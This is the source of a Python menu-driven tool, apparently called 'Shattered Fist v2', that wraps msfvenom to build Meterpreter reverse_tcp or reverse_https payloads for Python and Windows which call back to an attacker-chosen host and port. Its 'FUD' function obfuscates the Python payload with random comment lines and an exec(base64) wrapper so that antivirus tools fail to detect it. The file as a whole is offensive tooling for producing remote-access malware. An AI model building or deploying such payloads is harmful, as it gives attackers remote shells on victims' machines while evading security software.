#!/usr/bin/env python3
import colorama
import subprocess
import sys
import re 
import base64
import random
import string 
import time 
#custom import 
import varsx 


banner= ('''@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
@@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
!@@       @@!  @@@  @@!  @@@    @@!      @@!    @@!       @@!  @@@  @@!       @@!  !@@         @@!    
!@!       !@!  @!@  !@!  @!@    !@!      !@!    !@!       !@!  @!@  !@!       !@!  !@!         !@!    
!!@@!!    @!@!@!@!  @!@!@!@!    @!!      @!!    @!!!:!    @!@!!@!   @!!!:!    !!@  !!@@!!      @!!    
 !!@!!!   !!!@!!!!  !!!@!!!!    !!!      !!!    !!!!!:    !!@!@!    !!!!!:    !!!   !!@!!!     !!!    
     !:!  !!:  !!!  !!:  !!!    !!:      !!:    !!:       !!: :!!   !!:       !!:       !:!    !!:    
    !:!   :!:  !:!  :!:  !:!    :!:      :!:    :!:       :!:  !:!  :!:       :!:      !:!     :!:    
:::: ::   ::   :::  ::   :::     ::       ::     :: ::::  ::   :::   ::        ::  :::: ::      ::    
:: : :     :   : :   :   : :     :        :     : :: ::    :   : :   :        :    :: : :       :     
                                                                                                      
                                                                                                      
@@@  @@@   @@@@@@                                                                                     
@@@  @@@  @@@@@@@@                                                                                    
@@!  @@@       @@@                                                                                    
!@!  @!@      @!@                                                                                     
@!@  !@!     !!@                                                                                      
!@!  !!!    !!:                                                                                       
:!:  !!:   !:!                                                                                        
 ::!!:!   :!:                                                                                         
  ::::    :: :::::                                                                                    
   :      :: : :::                                                                                    
                                  ''')

lhost = varsx.lhost
lport = varsx.lport
pyoutfile = varsx.pyoutfile
winoutfile = varsx.winoutfile
talkbackm1 = "tcp"

def clearscreen():
    if sys.platform == "linux":
        subprocess.run("clear")
    elif sys.platform == "win32":
        subprocess.run("cls")

#For printopt func
n = 1
def printopt(texxt):  
    global n
    print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + str(n) + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + texxt + colorama.Style.RESET_ALL)
    n += 1   

def printbannred(texxt):
    return print(colorama.Fore.LIGHTRED_EX +  "#=====+" + texxt + "+=====#" )

    
    

def inputcopt(texxt):
    print("\n")
    dvhdnhhg = input(colorama.Fore.YELLOW + str(texxt) + colorama.Fore.WHITE).strip()
    print(colorama.Style.RESET_ALL)  
    return dvhdnhhg
def inputc(texxt):
    print("\n")
    dvhdnhhg = input(colorama.Fore.LIGHTBLUE_EX + str(texxt) + colorama.Fore.GREEN).strip()
    print(colorama.Style.RESET_ALL)  
    return dvhdnhhg    

def lask():
    global lhost, lport
    lhostask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX + "(" + lhost + ")" + colorama.Fore.BLUE + " : ")
    lportask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX +  "(" + lport +  ")" + colorama.Fore.BLUE + " : ")
    if lhostask.strip() != '':
        lhost = lhostask
    if lportask.strip() != '':
        lport = lportask    
    print(colorama.Style.RESET_ALL)

def payloadgen1(payload, talkback, lhost, lport, outfile):
    subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    


def asktb():
    global n, talkbackm1 
    n = 1 
    printopt("Use reverse_tcp")
    printopt("Use reverse_https")
    talkbackopt = inputcopt("Option: ").strip()
    if  talkbackopt == "1" or talkbackopt == "tcp":
        talkbackm1 = "tcp"
    elif talkbackopt == "2" or talkbackopt == "https":
        talkbackm1 = "https"
    else:
        print (f"{colorama.Fore.GREEN}Defaulting to {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}")

        


def pythonpayload():
    global n, pyoutfile, lhost, lport, talkbackm1 
    n = 1
    clearscreen()
    printbannred("Python Payload Menu")
    printopt("Create a simple python payload")
    printopt("Create an obfistucated (FUD) python payload")
    inputpy = inputc("Option: ").strip()
    lask()
    asktb()
    inputpy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({pyoutfile}){colorama.Fore.BLUE}: ")
    if inputpy2.strip() != "":
        pyoutfile = inputpy2
    #generate simple payload    
    if inputpy == "1":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
        print(colorama.Style.RESET_ALL)
    elif inputpy == "2": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
        pythonpayloadfud()

def pythonpayloadfud():
    print("Making payload FUD...")
    pytempf = open(pyoutfile + ".tmp", "r")
    dat1 = pytempf.readline()
    #part of file b4 base64 code
    b4b64 = "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('"
    #part of file after
    afb64 = "')[0]))"
    b64pycode = re.search("\('utf-8'\)\('(.+)'\)\[0\]\)", dat1).group(1)
    pytempf.close()
    pycode = base64.b64decode(b64pycode)
    #print(pycode)
    splpycode = pycode.decode().split("\n")
    #print(splpycode)
    pycodeembedlist = []
    for z in splpycode:
        pycodeembedlist.append(z)
        pycodeembedlist.append("\n")
        pycodeembedlist.append( '#' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)))
        pycodeembedlist.append("\n")
    finalcode = ''.join(pycodeembedlist)  
    finalcodeb64  = base64.b64encode(finalcode.encode("utf-8"))
    outpy = (b4b64 + str(finalcodeb64) + afb64)
    file = open(pyoutfile, "w")
    file.write(outpy)
    file.close
    print(colorama.Fore.LIGHTGREEN_EX + f"Done! \n Saved as {pyoutfile}" + colorama.Style.RESET_ALL)

def winpayload():                         
    global n, winoutfile, lhost, lport, talkbackm1
    printbannred("Windows Payload Menu")
    printopt("Create a simple windows payload")
    inputwin = inputcopt("Option: ").strip()
    lask()
    asktb()
    if inputwin == "1": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen1("windows", talkbackm1, lhost, lport, winoutfile)
        print(colorama.Style.RESET_ALL)
        print(colorama.Fore.LIGHTGREEN_EX + f"Done! \nSaved as {winoutfile}" + colorama.Style.RESET_ALL)

    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputwin} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(5)
        winpayload()   


    

def menu():
    printopt("Create a python payload (MSF)")
    printopt("Create a windows payload (MSF)")
    printopt("Create an android payload (MSF)")
    printopt("Start the Metasploit Framework Console")
    input1 = inputcopt("Option: ")
    if input1 == "1":
        pythonpayload()
    elif input1 == "2":
        winpayload()
    else:
        menu()        
        
def main():
    clearscreen()
    print (colorama.Fore.LIGHTRED_EX + banner +  colorama.Style.RESET_ALL)
    menu()

main()



    




                                                               